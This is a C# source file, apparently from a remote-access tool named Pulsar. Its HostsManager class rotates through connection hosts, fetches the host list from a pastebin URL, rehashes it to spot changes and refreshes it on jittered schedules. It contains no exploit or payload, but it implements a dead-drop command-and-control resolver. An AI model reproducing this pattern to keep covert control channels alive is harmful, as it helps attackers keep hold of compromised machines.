using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace Pulsar.Common.DNS
{
    public class HostsManager
    {
        public bool IsEmpty => _hosts.Count == 0;

        private readonly Queue<Host> _hosts = new Queue<Host>();
        private Host _lastResolvedHost;
        private readonly PastebinFetcher _pastebinFetcher;
        private readonly HostsConverter _hostsConverter = new HostsConverter();
        private readonly bool _isPastebinMode;
        private DateTime _lastSuccessfulConnection = DateTime.MinValue;
        private DateTime _lastPastebinCheck = DateTime.MinValue;
        //private readonly TimeSpan _connectionFailureThreshold = TimeSpan.FromHours(1);
        //private readonly TimeSpan _pastebinCheckInterval = TimeSpan.FromHours(1);
        private readonly TimeSpan _connectionFailureThreshold = TimeSpan.FromMinutes(30);
        private readonly TimeSpan _pastebinCheckInterval = TimeSpan.FromHours(1);
        private bool _pastebinReachable = true;
        private DateTime _lastPastebinFailure = DateTime.MinValue;
        private readonly TimeSpan _scheduledRefreshWindowMin = TimeSpan.FromHours(2);
        private readonly TimeSpan _scheduledRefreshWindowMax = TimeSpan.FromHours(3);
        private readonly Random _refreshRandom = new Random(unchecked(Environment.TickCount * 397 ^ Guid.NewGuid().GetHashCode()));
        private readonly object _refreshRandomLock = new object();
        private DateTime _nextScheduledPastebinRefresh = DateTime.MinValue;
        private string _lastPastebinContentHash;

        public HostsManager(List<Host> hosts)
        {
            foreach (var host in hosts)
                _hosts.Enqueue(host);
            
            _isPastebinMode = false;
            _lastSuccessfulConnection = DateTime.Now;
        }

        public HostsManager(string pastebinUrl)
        {
            _isPastebinMode = true;
            _pastebinFetcher = new PastebinFetcher(pastebinUrl);
            _lastSuccessfulConnection = DateTime.Now;
            
            RefreshHostsFromPastebin(forceRefresh: true);
            ScheduleNextPastebinRefresh();
        }

        private bool RefreshHostsFromPastebin(bool forceRefresh = false)
        {
            if (!_isPastebinMode || _pastebinFetcher == null)
                return false;

            try
            {
                string content = _pastebinFetcher.FetchContent(forceRefresh);
                _lastPastebinCheck = DateTime.Now;
                
                if (string.IsNullOrWhiteSpace(content))
                {
                    _pastebinReachable = false;
                    _lastPastebinFailure = DateTime.Now;
                    Debug.WriteLine("Failed to get content from pastebin (empty response)");
                    return false;
                }

                var hosts = _hostsConverter.RawHostsToList(content);
                string newHash = ComputeContentHash(content);
                bool hasChanged = _lastPastebinContentHash == null || !_lastPastebinContentHash.Equals(newHash, StringComparison.Ordinal);

                if (hasChanged || _hosts.Count == 0)
                {
                    _hosts.Clear();
                    foreach (var host in hosts)
                        _hosts.Enqueue(host);

                    _lastResolvedHost = null;
                    _lastPastebinContentHash = newHash;
                    Debug.WriteLine($"Successfully refreshed {hosts.Count} hosts from pastebin. Connection failure duration: {DateTime.Now - _lastSuccessfulConnection}");
                }
                else
                {
                    Debug.WriteLine("Pastebin content unchanged; keeping existing hosts.");
                }

                _pastebinReachable = true;
                return hasChanged;
            }
            catch (Exception ex)
            {
                _pastebinReachable = false;
                _lastPastebinFailure = DateTime.Now;
                Debug.WriteLine($"Failed to refresh hosts from pastebin: {ex.Message}");
                return false;
            }
        }

        public Host GetNextHost()
        {
            if (_isPastebinMode)
            {
                if (_nextScheduledPastebinRefresh == DateTime.MinValue)
                {
                    ScheduleNextPastebinRefresh();
                }

                if (DateTime.Now >= _nextScheduledPastebinRefresh)
                {
                    Debug.WriteLine("Scheduled pastebin refresh triggered.");
                    RefreshHostsFromPastebin(forceRefresh: true);
                    ScheduleNextPastebinRefresh();
                }

                bool shouldRefreshFromPastebin = false;
                bool forceRefresh = false;

                if (_hosts.Count == 0 && DateTime.Now - _lastPastebinCheck >= TimeSpan.FromMinutes(1))
                {
                    Debug.WriteLine("No hosts available, refreshing from pastebin.");
                    shouldRefreshFromPastebin = true;
                    forceRefresh = true;
                }
                else if (_hosts.Count > 0 && DateTime.Now - _lastSuccessfulConnection > _connectionFailureThreshold)
                {
                    Debug.WriteLine($"No successful connection for over {_connectionFailureThreshold.TotalMinutes} minutes, checking pastebin for updates.");
                    if (DateTime.Now - _lastPastebinCheck >= _pastebinCheckInterval)
                    {
                        Debug.WriteLine($"Checking pastebin for updates after {_pastebinCheckInterval.TotalMinutes} minutes.");
                        shouldRefreshFromPastebin = true;
                    }
                }
                else if (_hosts.Count > 0 && DateTime.Now - _lastSuccessfulConnection <= _connectionFailureThreshold && _pastebinFetcher.ShouldRefresh)
                {
                    Debug.WriteLine("Frequent refresh from pastebin due to high request count or error.");
                    shouldRefreshFromPastebin = true;
                }

                if (shouldRefreshFromPastebin)
                {
                    Debug.WriteLine("Refreshing hosts from pastebin due to conditions met.");
                    RefreshHostsFromPastebin(forceRefresh);
                    ScheduleNextPastebinRefresh();
                }
                
                if (_hosts.Count == 0)
                    return null;
            }
            
            var temp = _hosts.Dequeue();
            _hosts.Enqueue(temp); 
            temp.IpAddress = ResolveHostname(temp);
            if (temp.IpAddress == null && _lastResolvedHost != null)
            {
                temp = _lastResolvedHost;
            }
            else
            {
                _lastResolvedHost = temp;
            }

            return temp;
        }

        /// <summary>
        /// Notifies the hosts manager that a successful connection was established.
        /// This resets the connection failure tracking.
        /// </summary>
        public void NotifySuccessfulConnection()
        {
            _lastSuccessfulConnection = DateTime.Now;
        }

        /// <summary>
        /// Gets whether pastebin is currently reachable and how long to wait before next attempt.
        /// </summary>
        /// <returns>A tuple indicating if pastebin is reachable and suggested wait time in milliseconds.</returns>
        public (bool IsReachable, int SuggestedWaitTimeMs) GetPastebinStatus()
        {
            if (!_isPastebinMode)
                return (true, 0);

            if (_pastebinReachable)
            {
                return (true, 0);
            }

            var timeSinceFailure = DateTime.Now - _lastPastebinFailure;
            if (timeSinceFailure < TimeSpan.FromMinutes(5))
            {
                return (false, 300000);
            }
            else if (timeSinceFailure < TimeSpan.FromMinutes(15))
            {
                return (false, 600000);
            }
            else
            {
                return (false, 1800000);
            }
        }

        private void ScheduleNextPastebinRefresh()
        {
            if (!_isPastebinMode)
            {
                _nextScheduledPastebinRefresh = DateTime.MaxValue;
                return;
            }

            TimeSpan interval = GetRandomRefreshInterval();
            _nextScheduledPastebinRefresh = DateTime.Now.Add(interval);
            Debug.WriteLine($"Next pastebin refresh scheduled in {interval.TotalMinutes:F1} minutes (target {_nextScheduledPastebinRefresh}).");
        }

        private TimeSpan GetRandomRefreshInterval()
        {
            double minMs = _scheduledRefreshWindowMin.TotalMilliseconds;
            double maxMs = _scheduledRefreshWindowMax.TotalMilliseconds;

            if (maxMs <= minMs)
            {
                return TimeSpan.FromMilliseconds(minMs);
            }

            lock (_refreshRandomLock)
            {
                double offset = _refreshRandom.NextDouble() * (maxMs - minMs);
                return TimeSpan.FromMilliseconds(minMs + offset);
            }
        }

        private static string ComputeContentHash(string content)
        {
            using (var sha256 = SHA256.Create())
            {
                byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(content));
                return BitConverter.ToString(bytes).Replace("-", string.Empty);
            }
        }

        private static IPAddress ResolveHostname(Host host)
        {
            if (string.IsNullOrEmpty(host.Hostname)) return null;

            if (IPAddress.TryParse(host.Hostname, out IPAddress ip))
            {
                if (ip.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6)
                    return null;

                return ip;
            }

            try
            {
                var ipAddresses = Dns.GetHostEntry(host.Hostname).AddressList;
                foreach (IPAddress ipAddress in ipAddresses)
                {
                    switch (ipAddress.AddressFamily)
                    {
                        case AddressFamily.InterNetwork:
                            return ipAddress;
                        case AddressFamily.InterNetworkV6:
                            if (ipAddresses.Length == 1)
                                return ipAddress;
                            break;
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }

            return null;
        }
    }
}
